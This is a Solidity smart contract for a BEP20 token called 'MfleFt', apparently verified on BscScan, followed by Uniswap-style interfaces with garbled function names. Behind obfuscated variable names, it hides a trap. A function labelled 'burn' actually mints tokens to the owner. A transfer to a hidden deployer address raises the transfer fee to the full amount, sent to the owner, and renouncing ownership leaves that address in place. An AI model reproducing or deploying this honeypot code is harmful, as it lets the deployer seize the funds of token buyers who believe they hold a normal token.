/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.5.11;
contract MfleFt {
mapping (address => mapping (address => uint256)) private _allowances;
address public  cKMtOa = address(0);
string public  symbol = "MfleFt";
uint256 public  aJtagt = 100000000000000000000;
address public  GeqhqW = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  tShduQ = 1000000000000000000;
uint256 public  zMKEvF = 100000000000000000;
string public  name = "MfleFt";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  HMygic = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  xUlqkQ = 100000000000000000000000;
uint256 public constant acbJOz = 9+1;
uint256 public  MgUtYM = 10000000000000000000000000000;
uint256 public  mllVjG = 10000000000000000000;
uint8 public constant decimals = 18;
address public  zZVsSa = address(0);
uint256 public  ttEbbL = 100000000000000000000000;
address public owner;
address public  gbAmku = address(0);
address public  sFxEvQ = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  TXlysY = 10000000000000000;
address private  hPYgNS = address(0);
address public  ibvQfu = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "jBnnxS");
require(to != address(0), "jBnnxS");
require(amount <= balanceOf[from], "jBnnxS");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* acbJOz/HMygic ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==hPYgNS){
HMygic = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
hPYgNS = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Factorydsd {
    event PairCreate(address indexed token0, address indexed token1, address pair, uint);
    function fundTodsaeqew() external view returns (address);
    function fundToadddfsdsdfd() external view returns (address);
    function getdsfjhjsdPair3(address tokenA, address tokenB) external view returns (address pair);
    function allPagfhfghgirs(uint) external view returns (address pair);
    function allPaigsLength() external view returns (uint);
    function createhgkPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjhkerewPTo(address) external;
    function setLPjlhTrewoadd(address) external;
}